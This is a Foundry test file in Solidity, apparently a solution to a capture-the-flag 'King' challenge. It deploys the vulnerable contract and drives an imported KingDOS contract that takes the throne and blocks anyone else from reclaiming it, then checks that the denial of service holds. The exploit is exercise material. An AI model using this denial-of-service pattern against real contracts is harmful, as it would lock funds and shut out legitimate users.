// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/King/Level.sol";
import "forge-std/console.sol";
import "../utils/KingDOS.sol";

interface IKing {
    function _king() external view returns (address payable);

    function prize() external view returns (uint);
}

interface IKingDos {
    function lockThrone(address king) external payable;
}

contract KingTest is Test {
    IKing king;
    IKingDos kingDos;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        vm.deal(deployer, 5 ether);
        king = IKing(address((new King).value(1 ether)()));
        kingDos = IKingDos(address(new KingDOS()));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        kingDos.lockThrone.value(2 ether)(address(king));
        assert(address(king._king()) == address(kingDos));
        /* Write your code here */ 

        /* Validating the test */
        vm.stopPrank();
        vm.prank(deployer);
        (bool worked,) = address(king).call("");
        assertFalse(worked);
    }
}


